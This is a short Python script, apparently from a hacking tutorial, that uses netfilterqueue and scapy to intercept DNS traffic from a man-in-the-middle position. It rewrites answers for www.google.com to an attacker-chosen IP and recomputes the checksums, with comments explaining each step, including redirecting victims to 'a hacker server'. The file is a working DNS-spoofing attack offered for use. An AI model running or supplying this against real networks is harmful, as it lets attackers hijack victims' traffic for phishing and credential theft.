#!/usr/bin/env/ python
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload()) #converting the packet to a scpay packet by wraping the payload of
    # the packet with a scapy ip layer so as to access the data of the packet by using print(scapy_packet.show()
    if scapy_packet.haslayer(scapy.DNSRR): #we only want to work on the DNS layer and modify the responses of the DNS server
        #so we receive the request from the target computer(by becoming the man in the middle) and then forward it to the DNS server
        #wait for response from the DNS server and modify it to whatever website we want(maybe to a hacker server). In order to specify
        #DNS responses we use scapy.DNSRR(RR: Response Record) and if we wanted to specify the DNS requests we use scapy.DNSQR(QR: Question Record)
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1 # The original count of answers maybe of any value but we are only sending one answer hence we set it equal to one.

            del scapy_packet[scapy.IP].len      # the length layer specifies the size of the layer and the chksum is used to make sure that the packet has
            del scapy_packet[scapy.IP].chksum   # not been modified and to make sure that these values do not corrupt our scapy packet we deleter these fields
            del scapy_packet[scapy.UDP].chksum  # and then scapy automatically re-calculate these fields according to our modified packet before it gets sent
            del scapy_packet[scapy.UDP].len
    #print(scapy_packet.show()) #packet will get printed with its layers with the help of the .show() method just like we used this method on the packets sniffed with scapy

            packet.set_payload(str(scapy_packet)) # Here we typecast our scapy packet to a string because we at first converted the packet
            # to a scapy packet so as to print its layers and modify it accordingly also, if we print our original packet we will just get
            # a string of data inside this packet and we will not be able to access the layers nicely the same way that we do with the scapy packet.

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()


# get_payload() method will show us the actual content of the packet(payload) >> try, print(packet.get_payload())